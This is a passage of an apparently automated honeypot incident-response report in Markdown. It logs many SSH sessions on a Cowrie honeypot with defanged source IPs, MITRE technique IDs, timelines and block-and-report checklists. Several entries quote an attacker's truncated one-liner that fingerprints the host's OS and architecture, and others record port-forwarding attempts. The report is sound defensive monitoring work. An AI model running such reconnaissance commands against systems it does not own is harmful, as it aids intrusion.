| `2026-07-24 19:46:56` | `cowrie.command.input` |
| `2026-07-24 19:46:57` | `cowrie.log.closed` |
| `2026-07-24 19:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c424ed020eb2

| Field | Detail |
|---|---|
| **Source IP** | `209.173.10[.]75` |
| **First Seen** | 2026-07-24 19:47 |
| **Last Seen** | 2026-07-24 19:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:47:07` | `cowrie.session.connect` |
| `2026-07-24 19:47:08` | `cowrie.client.version` |
| `2026-07-24 19:47:08` | `cowrie.client.kex` |
| `2026-07-24 19:47:09` | `cowrie.login.success` |
| `2026-07-24 19:47:09` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.173.10[.]75` to AbuseIPDB if not already reported
- [ ] Block `209.173.10[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eada8374630f

| Field | Detail |
|---|---|
| **Source IP** | `87.117.32[.]22` |
| **First Seen** | 2026-07-24 19:47 |
| **Last Seen** | 2026-07-24 19:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:47:14` | `cowrie.session.connect` |
| `2026-07-24 19:47:15` | `cowrie.client.version` |
| `2026-07-24 19:47:15` | `cowrie.client.kex` |
| `2026-07-24 19:47:15` | `cowrie.login.success` |
| `2026-07-24 19:47:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.117.32[.]22` to AbuseIPDB if not already reported
- [ ] Block `87.117.32[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee5fc0529fb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:47 |
| **Last Seen** | 2026-07-24 19:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:47:58` | `cowrie.session.connect` |
| `2026-07-24 19:47:58` | `cowrie.client.version` |
| `2026-07-24 19:47:58` | `cowrie.client.kex` |
| `2026-07-24 19:48:02` | `cowrie.login.success` |
| `2026-07-24 19:48:05` | `cowrie.session.params` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.success` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.log.closed` |
| `2026-07-24 19:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4dce8147647

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:48 |
| **Last Seen** | 2026-07-24 19:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:48:01` | `cowrie.session.connect` |
| `2026-07-24 19:48:01` | `cowrie.client.version` |
| `2026-07-24 19:48:02` | `cowrie.client.kex` |
| `2026-07-24 19:48:03` | `cowrie.login.success` |
| `2026-07-24 19:48:04` | `cowrie.session.params` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.success` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:04` | `cowrie.command.input` |
| `2026-07-24 19:48:05` | `cowrie.log.closed` |
| `2026-07-24 19:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e25c14cbad

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:49 |
| **Last Seen** | 2026-07-24 19:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:49:07` | `cowrie.session.connect` |
| `2026-07-24 19:49:08` | `cowrie.client.version` |
| `2026-07-24 19:49:08` | `cowrie.client.kex` |
| `2026-07-24 19:49:11` | `cowrie.login.success` |
| `2026-07-24 19:49:13` | `cowrie.session.params` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.success` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:13` | `cowrie.command.input` |
| `2026-07-24 19:49:14` | `cowrie.log.closed` |
| `2026-07-24 19:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3da30e6deb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:49 |
| **Last Seen** | 2026-07-24 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:49:41` | `cowrie.session.connect` |
| `2026-07-24 19:49:41` | `cowrie.client.version` |
| `2026-07-24 19:49:41` | `cowrie.client.kex` |
| `2026-07-24 19:49:42` | `cowrie.login.success` |
| `2026-07-24 19:49:44` | `cowrie.session.params` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.success` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.command.input` |
| `2026-07-24 19:49:44` | `cowrie.log.closed` |
| `2026-07-24 19:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce865f460e51

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:50 |
| **Last Seen** | 2026-07-24 19:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:50:16` | `cowrie.session.connect` |
| `2026-07-24 19:50:16` | `cowrie.client.version` |
| `2026-07-24 19:50:16` | `cowrie.client.kex` |
| `2026-07-24 19:50:20` | `cowrie.login.success` |
| `2026-07-24 19:50:22` | `cowrie.session.params` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.success` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:22` | `cowrie.command.input` |
| `2026-07-24 19:50:23` | `cowrie.log.closed` |
| `2026-07-24 19:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d11a32e9fa3f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:51 |
| **Last Seen** | 2026-07-24 19:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:51:20` | `cowrie.session.connect` |
| `2026-07-24 19:51:20` | `cowrie.client.version` |
| `2026-07-24 19:51:21` | `cowrie.client.kex` |
| `2026-07-24 19:51:21` | `cowrie.login.success` |
| `2026-07-24 19:51:22` | `cowrie.session.params` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.success` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:22` | `cowrie.command.input` |
| `2026-07-24 19:51:23` | `cowrie.log.closed` |
| `2026-07-24 19:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c087f92c7d65

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:51 |
| **Last Seen** | 2026-07-24 19:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:51:24` | `cowrie.session.connect` |
| `2026-07-24 19:51:24` | `cowrie.client.version` |
| `2026-07-24 19:51:24` | `cowrie.client.kex` |
| `2026-07-24 19:51:28` | `cowrie.login.success` |
| `2026-07-24 19:51:30` | `cowrie.session.params` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.success` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:30` | `cowrie.command.input` |
| `2026-07-24 19:51:31` | `cowrie.log.closed` |
| `2026-07-24 19:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe24573b76c7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:52 |
| **Last Seen** | 2026-07-24 19:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:52:34` | `cowrie.session.connect` |
| `2026-07-24 19:52:35` | `cowrie.client.version` |
| `2026-07-24 19:52:35` | `cowrie.client.kex` |
| `2026-07-24 19:52:38` | `cowrie.login.success` |
| `2026-07-24 19:52:40` | `cowrie.session.params` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.success` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:40` | `cowrie.command.input` |
| `2026-07-24 19:52:41` | `cowrie.log.closed` |
| `2026-07-24 19:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e36c08ff2e6

| Field | Detail |
|---|---|
| **Source IP** | `207.254.71[.]129` |
| **First Seen** | 2026-07-24 19:52 |
| **Last Seen** | 2026-07-24 19:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:52:48` | `cowrie.session.connect` |
| `2026-07-24 19:52:48` | `cowrie.client.version` |
| `2026-07-24 19:52:48` | `cowrie.client.kex` |
| `2026-07-24 19:52:49` | `cowrie.login.success` |
| `2026-07-24 19:52:49` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.254.71[.]129` to AbuseIPDB if not already reported
- [ ] Block `207.254.71[.]129` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc031325dd6f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:52 |
| **Last Seen** | 2026-07-24 19:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:52:57` | `cowrie.session.connect` |
| `2026-07-24 19:52:57` | `cowrie.client.version` |
| `2026-07-24 19:52:57` | `cowrie.client.kex` |
| `2026-07-24 19:52:59` | `cowrie.login.success` |
| `2026-07-24 19:53:00` | `cowrie.session.params` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.success` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:00` | `cowrie.command.input` |
| `2026-07-24 19:53:01` | `cowrie.log.closed` |
| `2026-07-24 19:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb155d152bb

| Field | Detail |
|---|---|
| **Source IP** | `41.65.118[.]172` |
| **First Seen** | 2026-07-24 19:52 |
| **Last Seen** | 2026-07-24 19:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:52:59` | `cowrie.session.connect` |
| `2026-07-24 19:52:59` | `cowrie.client.version` |
| `2026-07-24 19:52:59` | `cowrie.client.kex` |
| `2026-07-24 19:53:01` | `cowrie.login.success` |
| `2026-07-24 19:53:01` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.65.118[.]172` to AbuseIPDB if not already reported
- [ ] Block `41.65.118[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fefba6fd3e5e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:53 |
| **Last Seen** | 2026-07-24 19:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:53:41` | `cowrie.session.connect` |
| `2026-07-24 19:53:41` | `cowrie.client.version` |
| `2026-07-24 19:53:41` | `cowrie.client.kex` |
| `2026-07-24 19:53:45` | `cowrie.login.success` |
| `2026-07-24 19:53:47` | `cowrie.session.params` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.success` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:47` | `cowrie.command.input` |
| `2026-07-24 19:53:48` | `cowrie.log.closed` |
| `2026-07-24 19:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab40eff2943

| Field | Detail |
|---|---|
